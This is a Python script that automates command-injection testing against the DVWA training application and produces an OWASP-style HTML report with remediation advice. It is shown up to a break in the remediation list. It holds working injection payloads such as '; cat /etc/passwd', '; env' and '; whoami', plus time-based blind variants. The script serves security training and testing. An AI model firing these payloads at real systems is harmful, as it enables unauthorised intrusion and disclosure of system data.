#!/usr/bin/env python3
"""
DVWA Command Injection Testing Script
OWASP OTG-INPVAL-013 Compliance
Generates OWASP/OSCP-style HTML report
"""

import requests
from bs4 import BeautifulSoup
import argparse
import datetime
import json
import os
import sys
import urllib3
import html
import time
from urllib.parse import urljoin

# Disable SSL warnings for localhost testing
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class DVWACommandInjectionTester:
    def __init__(self, base_url, username, password, output_file, timeout=15, delay=1):
        self.base_url = base_url.rstrip('/')
        self.login_url = urljoin(self.base_url + '/', 'login.php')
        self.timeout = timeout
        self.delay = delay
        self.username = username
        self.password = password
        self.output_file = output_file
        self.session = requests.Session()
        # Set a user agent to avoid potential blocking
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.results = []
        self.endpoints = []
        self.tested_payloads = []  # Store all tested payloads for reporting
        print(f"[*] Base URL: {self.base_url}")
        print(f"[*] Login URL: {self.login_url}")
        
    def get_csrf_token(self, url):
        """Extract CSRF token from page"""
        try:
            print(f"[*] Fetching page: {url}")
            response = self.session.get(url, verify=False, timeout=self.timeout)
            print(f"[*] Response status: {response.status_code}")
            
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Try multiple methods to find CSRF token
            token_input = soup.find('input', {'name': 'user_token'})
            if not token_input:
                # Try finding by ID
                token_input = soup.find('input', {'id': 'user_token'})
            if not token_input:
                # Try finding any hidden input that might be the token
                hidden_inputs = soup.find_all('input', {'type': 'hidden'})
                for inp in hidden_inputs:
                    if inp.get('name') and 'token' in inp.get('name').lower():
                        token_input = inp
                        break
            
            if token_input and token_input.get('value'):
                token = token_input['value']
                print(f"[+] Found CSRF token: {token[:20]}...")
                return token
            else:
                print("[-] CSRF token input not found in HTML")
                return None
                
        except Exception as e:
            print(f"[-] Error getting CSRF token: {e}")
            return None
    
    def login(self):
        """Login to DVWA"""
        print("[*] Logging into DVWA...")
        try:
            # First, get the main page to establish session
            print("[*] Getting main page to establish session...")
            main_response = self.session.get(self.base_url, verify=False, timeout=self.timeout)
            print(f"[*] Main page response status: {main_response.status_code}")
            
            # Get login page to extract CSRF token
            token = self.get_csrf_token(self.login_url)
            if not token:
                print("[-] Failed to get CSRF token")
                return False
            
            # Perform login
            login_data = {
                'username': self.username,
                'password': self.password,
                'Login': 'Login',
                'user_token': token
            }
            
            print("[*] Sending login request...")
            response = self.session.post(self.login_url, data=login_data, allow_redirects=True, verify=False, timeout=self.timeout)
            
            # Check if login was successful
            if "Login failed" in response.text or "login.php" in response.url:
                print("[-] Login failed")
                print(f"Response URL: {response.url}")
                return False
            
            print("[+] Login successful")
            return True
            
        except requests.exceptions.ConnectionError:
            print("[-] Connection error - make sure DVWA is running on localhost")
            return False
        except Exception as e:
            print(f"[-] Login error: {e}")
            return False
    
    def discover_endpoints(self):
        """Discover Command Execution endpoints in DVWA"""
        print("[*] Discovering Command Execution endpoints...")
        
        # Specific DVWA module to test
        dvwa_module = 'vulnerabilities/exec/'
        module_url = urljoin(self.base_url + '/', dvwa_module)
        
        try:
            print(f"[*] Checking module: {dvwa_module}")
            response = self.session.get(module_url, verify=False, timeout=self.timeout)
            
            if response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Find all forms
                forms = soup.find_all('form')
                for i, form in enumerate(forms):
                    action = form.get('action', '')
                    method = form.get('method', 'GET').upper()
                    
                    # Resolve relative URLs
                    if action:
                        full_action = urljoin(module_url, action)
                    else:
                        full_action = module_url
                    
                    # Extract form parameters
                    params = []
                    for input_field in form.find_all(['input', 'textarea', 'select']):
                        param_name = input_field.get('name')
                        param_type = input_field.get('type', 'text')
                        if param_name:
                            params.append({
                                'name': param_name,
                                'type': param_type
                            })
                    
                    endpoint_info = {
                        'url': full_action,
                        'method': method,
                        'parameters': params,
                        'module': dvwa_module
                    }
                    
                    # Avoid duplicates
                    if endpoint_info not in self.endpoints:
                        self.endpoints.append(endpoint_info)
                        param_names = [p['name'] for p in params]
                        print(f"[+] Found endpoint: {full_action} with params: {param_names}")
            
        except Exception as e:
            print(f"[-] Error checking module {dvwa_module}: {e}")
        
        print(f"[+] Discovered {len(self.endpoints)} endpoints")
    
    def test_command_injection(self):
        """Test Command Injection on Command Execution module"""
        print("[*] Testing Command Injection...")
        
        # Find Command Execution endpoint
        exec_endpoint = None
        for endpoint in self.endpoints:
            if 'exec' in endpoint['module']:
                exec_endpoint = endpoint
                break
        
        if not exec_endpoint:
            print("[-] Command Execution endpoint not found")
            return
        
        url = exec_endpoint['url']
        parameters = exec_endpoint['parameters']
        module = exec_endpoint['module']
        method = exec_endpoint['method']
        
        print(f"[*] Testing Command Injection on: {url}")
        print(f"[*] Available parameters: {[p['name'] for p in parameters]}")
        
        # Command Injection payloads
        command_payloads = [
            # Basic Command Chaining
            {
                'name': 'Semicolon Separator - whoami',
                'payload': '; whoami',
                'expected': ['root', 'administrator', 'www-data', 'apache', 'nginx'],
                'type': 'Basic Chaining',
                'separator': ';'
            },
            {
                'name': 'AND Operator - whoami',
                'payload': '&& whoami',
                'expected': ['root', 'administrator', 'www-data', 'apache', 'nginx'],
                'type': 'Basic Chaining',
                'separator': '&&'
            },
            {
                'name': 'Pipe Operator - whoami',
                'payload': '| whoami',
                'expected': ['root', 'administrator', 'www-data', 'apache', 'nginx'],
                'type': 'Basic Chaining',
                'separator': '|'
            },
            {
                'name': 'Background Operator - whoami',
                'payload': '& whoami',
                'expected': ['root', 'administrator', 'www-data', 'apache', 'nginx'],
                'type': 'Basic Chaining',
                'separator': '&'
            },
            
            # File System Interaction
            {
                'name': 'List Directory (Unix)',
                'payload': '; ls',
                'expected': ['index', 'config', 'login', '.php'],
                'type': 'File System',
                'separator': ';'
            },
            {
                'name': 'List Directory (Windows)',
                'payload': '&& dir',
                'expected': ['Directory', 'File(s)', '.php'],
                'type': 'File System',
                'separator': '&&'
            },
            {
                'name': 'Read File (Unix)',
                'payload': '; cat /etc/passwd',
                'expected': ['root:x:', 'daemon:x:', 'bin:x:'],
                'type': 'File System',
                'separator': ';'
            },
            {
                'name': 'Read File (Windows)',
                'payload': '&& type C:\\windows\\system32\\drivers\\etc\\hosts',
                'expected': ['127.0.0.1', 'localhost'],
                'type': 'File System',
                'separator': '&&'
            },
            
            # OS Detection
            {
                'name': 'OS Detection - uname',
                'payload': '; uname -a',
                'expected': ['Linux', 'GNU', 'kernel'],
                'type': 'OS Detection',
                'separator': ';'
            },
            {
                'name': 'OS Detection - ver',
                'payload': '&& ver',
                'expected': ['Windows', 'Microsoft'],
                'type': 'OS Detection',
                'separator': '&&'
            },
            
            # Network Information
            {
                'name': 'Network Info - ifconfig',
                'payload': '; ifconfig',
                'expected': ['inet', 'addr:', '127.0.0.1'],
                'type': 'Network Info',
                'separator': ';'
            },
            {
                'name': 'Network Info - ipconfig',
                'payload': '&& ipconfig',
                'expected': ['Windows IP Configuration', 'IPv4', '127.0.0.1'],
                'type': 'Network Info',
                'separator': '&&'
            },
            
            # Environment Variables
            {
                'name': 'Environment Variables',
                'payload': '; env',
                'expected': ['PATH=', 'HOME=', 'USER='],
                'type': 'Environment',
                'separator': ';'
            },
            
            # Echo Commands
            {
                'name': 'Echo Command',
                'payload': '| echo "COMMAND-INJECTION-DETECTED"',
                'expected': 'COMMAND-INJECTION-DETECTED',
                'type': 'Basic Chaining',
                'separator': '|'
            }
        ]
        
        # Find the command parameter (be more flexible in naming)
        cmd_param = None
        for param in parameters:
            param_name = param['name'].lower()
            if 'ip' in param_name or 'cmd' in param_name or 'command' in param_name or 'host' in param_name:
                cmd_param = param['name']
                break
        
        if not cmd_param:
            # If no specific command param found, use the first text parameter
            for param in parameters:
                if param['type'] in ['text', 'textarea']:
                    cmd_param = param['name']
                    break
        
        if not cmd_param:
            print("[-] No suitable parameter found for command injection testing")
            return
        
        print(f"[*] Using parameter for injection: {cmd_param}")
        
        # Test each payload
        for payload_info in command_payloads:
            payload_name = payload_info['name']
            payload_value = payload_info['payload']
            expected_result = payload_info['expected']
            cmd_type = payload_info['type']
            separator = payload_info['separator']
            
            # Store payload for reporting
            self.tested_payloads.append({
                'name': payload_name,
                'payload': payload_value,
                'type': cmd_type,
                'separator': separator,
                'category': 'Command Injection'
            })
            
            try:
                print(f"  [*] Testing {payload_name}")
                
                # Respect delay between requests
                time.sleep(self.delay)
                
                # Create data with payload
                data = {}
                for param in parameters:
                    if param['name'] == cmd_param:
                        data[param['name']] = payload_value
                    else:
                        # Set default values for other parameters
                        if 'submit' in param['name'].lower():
                            data[param['name']] = 'Submit'
                        else:
                            data[param['name']] = '127.0.0.1'  # Default IP for exec module
                
                print(f"  [*] Sending {method} request with  {data}")
                
                # Send request
                start_time = time.time()
                if method.upper() == 'GET':
                    response = self.session.get(url, params=data, verify=False, timeout=self.timeout)
                else:
                    response = self.session.post(url, data=data, verify=False, timeout=self.timeout)
                end_time = time.time()
                
                response_time = end_time - start_time
                
                # Analyze response
                result = {
                    'url': url,
                    'module': module,
                    'vuln_type': 'Command Injection',
                    'parameter': cmd_param,
                    'payload_name': payload_name,
                    'payload': payload_value,
                    'command_type': cmd_type,
                    'separator': separator,
                    'status_code': response.status_code,
                    'response_length': len(response.text),
                    'response_time': round(response_time, 2),
                    'vulnerable': False,
                    'description': '',
                    'response_preview': response.text[:300] + '...' if len(response.text) > 300 else response.text
                }
                
                # Check for command injection indicators
                response_lower = response.text.lower()
                
                if isinstance(expected_result, list):
                    # Check for any of the expected strings
                    for expected in expected_result:
                        if expected.lower() in response_lower:
                            result['vulnerable'] = True
                            result['description'] = f"Found expected result: {expected}"
                            break
                else:
                    # Check for single expected string
                    if expected_result.lower() in response_lower:
                        result['vulnerable'] = True
                        result['description'] = f"Found expected result: {expected_result}"
                
                # Additional checks for common command injection indicators
                cmd_indicators = [
                    'uid=',
                    'gid=',
                    'groups=',
                    'root:x:',
                    'administrator',
                    'www-data',
                    'apache',
                    'nginx',
                    'directory of',
                    'volume in drive',
                    'inet addr:',
                    '127.0.0.1',
                    'command-injection-detected',
                    'path=',
                    'home=',
                    'user=',
                    'linux',
                    'windows',
                    'microsoft'
                ]
                
                for indicator in cmd_indicators:
                    if indicator in response_lower and not result['vulnerable']:
                        result['vulnerable'] = True
                        result['description'] = f"Found command injection indicator: {indicator}"
                        break
                
                self.results.append(result)
                
                if result['vulnerable']:
                    print(f"  [+] VULNERABLE: {payload_name} - {result['description']}")
                else:
                    print(f"  [-] NOT VULNERABLE: {payload_name}")
                
            except Exception as e:
                print(f"  [-] Error testing {payload_name}: {e}")
                self.results.append({
                    'url': url,
                    'module': module,
                    'vuln_type': 'Command Injection',
                    'parameter': cmd_param,
                    'payload_name': payload_name,
                    'payload': payload_value,
                    'command_type': cmd_type,
                    'separator': separator,
                    'status_code': 0,
                    'response_length': 0,
                    'response_time': 0,
                    'vulnerable': False,
                    'description': f'Error: {str(e)}',
                    'error': True
                })
    
    def test_blind_command_injection(self):
        """Test Blind Command Injection with time-based payloads"""
        print("[*] Testing Blind Command Injection...")
        
        # Find Command Execution endpoint
        exec_endpoint = None
        for endpoint in self.endpoints:
            if 'exec' in endpoint['module']:
                exec_endpoint = endpoint
                break
        
        if not exec_endpoint:
            print("[-] Command Execution endpoint not found")
            return
        
        url = exec_endpoint['url']
        parameters = exec_endpoint['parameters']
        module = exec_endpoint['module']
        method = exec_endpoint['method']
        
        # Time-based payloads for blind injection
        time_payloads = [
            {
                'name': 'Sleep Command (Unix)',
                'payload': '; sleep 5',
                'delay': 5,
                'type': 'Time-based',
                'separator': ';'
            },
            {
                'name': 'Ping Command (Unix)',
                'payload': '&& ping -c 5 127.0.0.1',
                'delay': 5,
                'type': 'Time-based',
                'separator': '&&'
            },
            {
                'name': 'Timeout Command (Windows)',
                'payload': '| timeout 5',
                'delay': 5,
                'type': 'Time-based',
                'separator': '|'
            },
            {
                'name': 'Sleep Command (Windows)',
                'payload': '& timeout /t 5',
                'delay': 5,
                'type': 'Time-based',
                'separator': '&'
            }
        ]
        
        # Find the command parameter
        cmd_param = None
        for param in parameters:
            param_name = param['name'].lower()
            if 'ip' in param_name or 'cmd' in param_name or 'command' in param_name or 'host' in param_name:
                cmd_param = param['name']
                break
        
        if not cmd_param:
            # If no specific command param found, use the first text parameter
            for param in parameters:
                if param['type'] in ['text', 'textarea']:
                    cmd_param = param['name']
                    break
        
        if not cmd_param:
            print("[-] No suitable parameter found for blind command injection testing")
            return
        
        print(f"[*] Testing Blind Command Injection on parameter: {cmd_param}")
        
        # Test each time-based payload
        for payload_info in time_payloads:
            payload_name = payload_info['name']
            payload_value = payload_info['payload']
            expected_delay = payload_info['delay']
            cmd_type = payload_info['type']
            separator = payload_info['separator']
            
            # Store payload for reporting
            self.tested_payloads.append({
                'name': payload_name,
                'payload': payload_value,
                'type': cmd_type,
                'separator': separator,
                'category': 'Blind Command Injection'
            })
            
            try:
                print(f"  [*] Testing {payload_name} (expecting {expected_delay}s delay)")
                
                # Create data with payload
                data = {}
                for param in parameters:
                    if param['name'] == cmd_param:
                        data[param['name']] = payload_value
                    else:
                        # Set default values for other parameters
                        if 'submit' in param['name'].lower():
                            data[param['name']] = 'Submit'
                        else:
                            data[param['name']] = '127.0.0.1'
                
                # Send request and measure response time
                start_time = time.time()
                if method.upper() == 'GET':
                    response = self.session.get(url, params=data, verify=False, timeout=self.timeout + expected_delay + 5)
                else:
                    response = self.session.post(url, data=data, verify=False, timeout=self.timeout + expected_delay + 5)
                end_time = time.time()
                
                response_time = end_time - start_time
                print(f"  [*] Response time: {response_time:.2f}s")
                
                # Analyze response
                result = {
                    'url': url,
                    'module': module,
                    'vuln_type': 'Blind Command Injection',
                    'parameter': cmd_param,
                    'payload_name': payload_name,
                    'payload': payload_value,
                    'command_type': cmd_type,
                    'separator': separator,
                    'status_code': response.status_code,
                    'response_length': len(response.text),
                    'response_time': round(response_time, 2),
                    'vulnerable': False,
                    'description': '',
                    'response_preview': response.text[:300] + '...' if len(response.text) > 300 else response.text
                }
                
                # Check for time-based injection
                if response_time >= expected_delay:
                    result['vulnerable'] = True
                    result['description'] = f"Response delayed by {response_time:.2f}s (expected {expected_delay}s)"
                
                self.results.append(result)
                
                if result['vulnerable']:
                    print(f"  [+] VULNERABLE: {payload_name} - {result['description']}")
                else:
                    print(f"  [-] NOT VULNERABLE: {payload_name}")
                
            except Exception as e:
                print(f"  [-] Error testing {payload_name}: {e}")
                self.results.append({
                    'url': url,
                    'module': module,
                    'vuln_type': 'Blind Command Injection',
                    'parameter': cmd_param,
                    'payload_name': payload_name,
                    'payload': payload_value,
                    'command_type': cmd_type,
                    'separator': separator,
                    'status_code': 0,
                    'response_length': 0,
                    'response_time': 0,
                    'vulnerable': False,
                    'description': f'Error: {str(e)}',
                    'error': True
                })

    def generate_html_report(self):
        """Generate OWASP/OSCP-style HTML report"""
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        vulnerable_count = sum(1 for r in self.results if r.get('vulnerable', False))
        
        # Separate results by vulnerability type
        command_injection_results = [r for r in self.results if r.get('vuln_type') == 'Command Injection']
        blind_injection_results = [r for r in self.results if r.get('vuln_type') == 'Blind Command Injection']
        
        command_injection_vuln = sum(1 for r in command_injection_results if r.get('vulnerable', False))
        blind_injection_vuln = sum(1 for r in blind_injection_results if r.get('vulnerable', False))
        
        html_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Command Injection Assessment - DVWA (OTG-INPVAL-013)</title>
    <style>
        body {{
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
            color: #333;
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f5f5f5;
        }}
        .header {{
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            color: white;
            padding: 30px;
            border-radius: 8px;
            margin-bottom: 30px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }}
        .header h1 {{
            margin: 0;
            font-size: 2.2em;
        }}
        .header p {{
            margin: 10px 0 0 0;
            opacity: 0.9;
        }}
        .section {{
            background: white;
            margin-bottom: 25px;
            padding: 25px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }}
        .section-title {{
            color: #2a5298;
            border-bottom: 2px solid #2a5298;
            padding-bottom: 10px;
            margin-top: 0;
        }}
        table {{
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
        }}
        th, td {{
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }}
        th {{
            background-color: #2a5298;
            color: white;
        }}
        tr:nth-child(even) {{
            background-color: #f2f2f2;
        }}
        .vulnerable {{
            background-color: #ffebee;
            color: #c62828;
            padding: 5px 10px;
            border-radius: 4px;
            font-weight: bold;
        }}
        .not-vulnerable {{
            background-color: #e8f5e8;
            color: #2e7d32;
            padding: 5px 10px;
            border-radius: 4px;
            font-weight: bold;
        }}
        .code {{
            background-color: #2d2d2d;
            color: #f8f8f2;
            padding: 15px;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
            overflow-x: auto;
            margin: 15px 0;
            white-space: pre-wrap;
        }}
        .risk-high {{
            color: #d32f2f;
            font-weight: bold;
        }}
        .risk-medium {{
            color: #f57c00;
            font-weight: bold;
        }}
        .footer {{
            text-align: center;
            margin-top: 30px;
            padding: 20px;
            color: #666;
            font-size: 0.9em;
        }}
        .summary-box {{
            background: linear-gradient(135deg, #e3f2fd 0%, #bbdefb 100%);
            padding: 20px;
            border-radius: 8px;
            margin: 20px 0;
            border-left: 5px solid #1e88e5;
        }}
        .findings-summary {{
            display: flex;
            justify-content: space-around;
            text-align: center;
            margin: 20px 0;
        }}
        .finding-item {{
            padding: 15px;
            border-radius: 8px;
            color: white;
        }}
        .finding-vuln {{
            background-color: #d32f2f;
        }}
        .finding-safe {{
            background-color: #388e3c;
        }}
        code {{
            font-family: 'Courier New', monospace;
            background-color: #f5f5f5;
            padding: 2px 4px;
            border-radius: 3px;
        }}
        .tab {{
            overflow: hidden;
            border: 1px solid #ccc;
            background-color: #f1f1f1;
            border-radius: 5px 5px 0 0;
        }}
        .tab button {{
            background-color: inherit;
            float: left;
            border: none;
            outline: none;
            cursor: pointer;
            padding: 14px 16px;
            transition: 0.3s;
            font-size: 16px;
        }}
        .tab button:hover {{
            background-color: #ddd;
        }}
        .tab button.active {{
            background-color: #2a5298;
            color: white;
        }}
        .tabcontent {{
            display: none;
            padding: 20px;
            border: 1px solid #ccc;
            border-top: none;
            border-radius: 0 0 5px 5px;
            background-color: white;
        }}
        .payload-table {{
            font-size: 0.9em;
        }}
        .payload-table th, .payload-table td {{
            padding: 8px;
        }}
    </style>
</head>
<body>
    <div class="header">
        <h1>Command Injection Assessment</h1>
        <p>DVWA Security Test - OWASP Testing Guide OTG-INPVAL-013</p>
    </div>

    <div class="section">
        <h2 class="section-title">Executive Summary</h2>
        <div class="summary-box">
            <p>This assessment identified <span class="risk-high">{vulnerable_count} Command Injection vulnerabilities</span> in the DVWA Command Execution module. Command Injection allows attackers to execute arbitrary system commands, potentially leading to complete system compromise, sensitive data disclosure, and unauthorized access to underlying infrastructure.</p>
        </div>
        <div class="findings-summary">
            <div class="finding-item finding-vuln">
                <h3>{vulnerable_count}</h3>
                <p>Total Vulnerabilities</p>
            </div>
            <div class="finding-item finding-safe">
                <h3>{len(self.results) - vulnerable_count}</h3>
                <p>Secure Tests</p>
            </div>
        </div>
    </div>

    <div class="section">
        <h2 class="section-title">Test Details</h2>
        <table>
            <tr>
                <td><strong>Target Application</strong></td>
                <td>Damn Vulnerable Web Application (DVWA)</td>
            </tr>
            <tr>
                <td><strong>Test Type</strong></td>
                <td>Command Injection</td>
            </tr>
            <tr>
                <td><strong>OWASP Test ID</strong></td>
                <td>OTG-INPVAL-013</td>
            </tr>
            <tr>
                <td><strong>Risk Level</strong></td>
                <td><span class="risk-high">High</span></td>
            </tr>
            <tr>
                <td><strong>Test Date</strong></td>
                <td>{timestamp}</td>
            </tr>
            <tr>
                <td><strong>Target URL</strong></td>
                <td>{self.base_url}</td>
            </tr>
        </table>
    </div>

    <div class="section">
        <h2 class="section-title">Methodology</h2>
        <p>The testing methodology followed the OWASP Testing Guide for Command Injection:</p>
        <ol>
            <li><strong>Authentication</strong>: Logged into DVWA with provided credentials</li>
            <li><strong>Module Identification</strong>: Identified Command Execution module</li>
            <li><strong>Command Injection Testing</strong>: Tested various command injection payloads including basic chaining, file system interaction, and OS detection</li>
            <li><strong>Blind Injection Testing</strong>: Tested time-based command injection payloads</li>
            <li><strong>Analysis</strong>: Documented vulnerable endpoints and payloads</li>
        </ol>
    </div>

    <div class="section">
        <h2 class="section-title">Tested Payloads</h2>
        <p>The following payloads were tested during the assessment:</p>
        <table class="payload-table">
            <thead>
                <tr>
                    <th>Payload Name</th>
                    <th>Category</th>
                    <th>Command Type</th>
                    <th>Separator</th>
                    <th>Payload</th>
                </tr>
            </thead>
            <tbody>"""
        
        # Add tested payloads to report
        for payload in self.tested_payloads:
            html_content += f"""
                <tr>
                    <td>{html.escape(payload.get('name', 'N/A'))}</td>
                    <td>{html.escape(payload.get('category', 'N/A'))}</td>
                    <td>{html.escape(payload.get('type', 'N/A'))}</td>
                    <td>{html.escape(payload.get('separator', 'N/A'))}</td>
                    <td><code>{html.escape(payload.get('payload', 'N/A'))}</code></td>
                </tr>"""
        
        html_content += f"""
            </tbody>
        </table>
    </div>

    <div class="section">
        <h2 class="section-title">Vulnerability Summary</h2>
        <div class="findings-summary">
            <div class="finding-item finding-vuln">
                <h3>{command_injection_vuln}</h3>
                <p>Command Injection</p>
            </div>
            <div class="finding-item finding-vuln">
                <h3>{blind_injection_vuln}</h3>
                <p>Blind Command Injection</p>
            </div>
        </div>
    </div>

    <div class="section">
        <h2 class="section-title">Detailed Findings</h2>
        
        <div class="tab">
            <button class="tablinks active" onclick="openTab(event, 'commandinjection')">Command Injection</button>
            <button class="tablinks" onclick="openTab(event, 'blindinjection')">Blind Command Injection</button>
        </div>

        <div id="commandinjection" class="tabcontent" style="display:block">
            <h3>Command Injection Results</h3>
            <p>The following Command Injection tests were conducted:</p>
            <table>
                <thead>
                    <tr>
                        <th>Module</th>
                        <th>Parameter</th>
                        <th>Command Type</th>
                        <th>Separator</th>
                        <th>Payload Name</th>
                        <th>Status</th>
                        <th>Response Time (s)</th>
                    </tr>
                </thead>
                <tbody>"""
        
        # Command Injection results
        for result in command_injection_results:
            status_class = "vulnerable" if result.get('vulnerable', False) else "not-vulnerable"
            status_text = "VULNERABLE" if result.get('vulnerable', False) else "NOT VULNERABLE"
            
            html_content += f"""
                    <tr>
                        <td>{html.escape(result.get('module', 'Unknown'))}</td>
                        <td>{html.escape(result.get('parameter', 'N/A'))}</td>
                        <td>{html.escape(result.get('command_type', 'N/A'))}</td>
                        <td>{html.escape(result.get('separator', 'N/A'))}</td>
                        <td>{html.escape(result.get('payload_name', 'N/A'))}</td>
                        <td><span class="{status_class}">{status_text}</span></td>
                        <td>{result.get('response_time', 'N/A')}</td>
                    </tr>"""
            
            # Add description row if vulnerable
            if result.get('vulnerable', False):
                html_content += f"""
                    <tr>
                        <td colspan="7" style="background-color: #fff3e0;">
                            <strong>Description:</strong> {html.escape(result.get('description', ''))}<br>
                            <strong>Payload:</strong> {html.escape(result.get('payload', ''))}
                        </td>
                    </tr>"""
        
        html_content += f"""
                </tbody>
            </table>
            
            <h4>Command Injection Vulnerabilities</h4>"""
        
        # Show only vulnerable Command Injection results
        vulnerable_command_results = [r for r in command_injection_results if r.get('vulnerable', False)]
        
        if vulnerable_command_results:
            for i, result in enumerate(vulnerable_command_results, 1):
                html_content += f"""
            <div class="code">
<strong>Vulnerability #{i}</strong>
Module: {html.escape(result.get('module', 'Unknown'))}
Endpoint: {html.escape(result.get('url', 'N/A'))}
Parameter: {html.escape(result.get('parameter', 'N/A'))}
Command Type: {html.escape(result.get('command_type', 'N/A'))}
Separator: {html.escape(result.get('separator', 'N/A'))}
Payload Name: {html.escape(result.get('payload_name', 'N/A'))}
Payload: {html.escape(result.get('payload', ''))}
Description: {html.escape(result.get('description', ''))}
Status Code: {result.get('status_code', 'N/A')}
Response Time: {result.get('response_time', 'N/A')}s
Response Preview: {html.escape(result.get('response_preview', '')[:300])}
            </div>"""
        else:
            html_content += """
            <p>No Command Injection vulnerabilities were found.</p>"""
        
        html_content += """
        </div>

        <div id="blindinjection" class="tabcontent">
            <h3>Blind Command Injection Results</h3>
            <p>The following Blind Command Injection tests were conducted:</p>
            <table>
                <thead>
                    <tr>
                        <th>Module</th>
                        <th>Parameter</th>
                        <th>Command Type</th>
                        <th>Separator</th>
                        <th>Payload Name</th>
                        <th>Status</th>
                        <th>Response Time (s)</th>
                        <th>Expected Delay (s)</th>
                    </tr>
                </thead>
                <tbody>"""
        
        # Blind Command Injection results
        for result in blind_injection_results:
            status_class = "vulnerable" if result.get('vulnerable', False) else "not-vulnerable"
            status_text = "VULNERABLE" if result.get('vulnerable', False) else "NOT VULNERABLE"
            
            # Extract expected delay from payload name
            expected_delay = "5"  # Default for our payloads
            if "sleep" in result.get('payload_name', '').lower() or "timeout" in result.get('payload_name', '').lower() or "ping" in result.get('payload_name', '').lower():
                expected_delay = "5"
            
            html_content += f"""
                    <tr>
                        <td>{html.escape(result.get('module', 'Unknown'))}</td>
                        <td>{html.escape(result.get('parameter', 'N/A'))}</td>
                        <td>{html.escape(result.get('command_type', 'N/A'))}</td>
                        <td>{html.escape(result.get('separator', 'N/A'))}</td>
                        <td>{html.escape(result.get('payload_name', 'N/A'))}</td>
                        <td><span class="{status_class}">{status_text}</span></td>
                        <td>{result.get('response_time', 'N/A')}</td>
                        <td>{expected_delay}</td>
                    </tr>"""
            
            # Add description row if vulnerable
            if result.get('vulnerable', False):
                html_content += f"""
                    <tr>
                        <td colspan="8" style="background-color: #fff3e0;">
                            <strong>Description:</strong> {html.escape(result.get('description', ''))}<br>
                            <strong>Payload:</strong> {html.escape(result.get('payload', ''))}
                        </td>
                    </tr>"""
        
        html_content += f"""
                </tbody>
            </table>
            
            <h4>Blind Command Injection Vulnerabilities</h4>"""
        
        # Show only vulnerable Blind Command Injection results
        vulnerable_blind_results = [r for r in blind_injection_results if r.get('vulnerable', False)]
        
        if vulnerable_blind_results:
            for i, result in enumerate(vulnerable_blind_results, 1):
                html_content += f"""
            <div class="code">
<strong>Vulnerability #{i}</strong>
Module: {html.escape(result.get('module', 'Unknown'))}
Endpoint: {html.escape(result.get('url', 'N/A'))}
Parameter: {html.escape(result.get('parameter', 'N/A'))}
Command Type: {html.escape(result.get('command_type', 'N/A'))}
Separator: {html.escape(result.get('separator', 'N/A'))}
Payload Name: {html.escape(result.get('payload_name', 'N/A'))}
Payload: {html.escape(result.get('payload', ''))}
Description: {html.escape(result.get('description', ''))}
Status Code: {result.get('status_code', 'N/A')}
Response Time: {result.get('response_time', 'N/A')}s
Response Preview: {html.escape(result.get('response_preview', '')[:300])}
            </div>"""
        else:
            html_content += """
            <p>No Blind Command Injection vulnerabilities were found.</p>"""
        
        html_content += """
        </div>
    </div>

    <div class="section">
        <h2 class="section-title">Command Injection Techniques</h2>
        
        <h3>Command Separators</h3>
        <p>Command injection often relies on special characters to separate commands:</p>
        <ul>
            <li><strong>Semicolon (<code>;</code>)</strong>: Executes commands sequentially regardless of previous command success</li>
            <li><strong>AND (<code>&&</code>)</strong>: Executes the second command only if the first succeeds</li>
            <li><strong>OR (<code>||</code>)</strong>: Executes the second command only if the first fails</li>
            <li><strong>Pipe (<code>|</code>)</strong>: Pipes the output of the first command as input to the second</li>
            <li><strong>Background (<code>&</code>)</strong>: Runs the command in the background</li>
        </ul>
        
        <h3>Command Injection Types</h3>
        <ul>
            <li><strong>Direct Injection</strong>: Command output is directly returned in the HTTP response</li>
            <li><strong>Blind Injection</strong>: No direct output; detection through time delays or out-of-band techniques</li>
            <li><strong>Out-of-Band Injection</strong>: Uses external channels (DNS, HTTP) to exfiltrate data</li>
        </ul>
        
        <h3>Common Attack Payloads</h3>
        <ul>
            <li><strong>Information Gathering</strong>: <code>; whoami</code>, <code>&& id</code>, <code>| uname -a</code></li>
            <li><strong>File System Access</strong>: <code>; ls</code>, <code>&& dir</code>, <code>| cat /etc/passwd</code></li>
            <li><strong>Network Reconnaissance</strong>: <code>; ifconfig</code>, <code>&& ipconfig</code>, <code>| netstat -an</code></li>
            <li><strong>Time-based Detection</strong>: <code>; sleep 10</code>, <code>&& timeout 10</code></li>
        </ul>
    </div>

    <div class="section">
        <h2 class="section-title">Remediation Recommendations</h2>
        <p>To prevent Command Injection vulnerabilities, implement the following measures:</p>
        
        <h3>Input Validation and Sanitization</h3>
        <ol>
            <li><strong>Whitelist Approach</strong>: Only allow known good input patterns</li>
            <li><strong>Blacklist Approach</strong>: Block dangerous characters and command separators</li>
            <li><strong>Input Length Limits</strong>: Restrict input length to prevent complex payloads</li>
            <li><strong>Character Encoding</strong>: Properly encode special characters</li>
        </ol>
        
        <h3>Secure Coding Practices</h3>
        <ol>
            <li><strong>Avoid Shell Execution</strong>: Use secure APIs instead of system calls when possible</li>
            <li><strong>Parameterized Commands</strong>: Use parameterized command execution functions</li>
            <li><strong>Privilege Separation</strong>: Run applications with minimal privileges</li>
            <li><strong>Output Encoding</strong>: Encode command output before displaying</li>
        </ol>
        
        <h3>Web Server Configuration</h3>
        <ol>
            <li><strong>Disable Dangerous Functions</strong>: Disable shell execution functions in PHP/other languages</li>
            <li><strong>Web Application Firewall</strong>: Implement WAF rules to detect command injection attempts</li>
            <li><strong>Request Monitoring</strong>: Monitor and log suspicious command-like input</li>
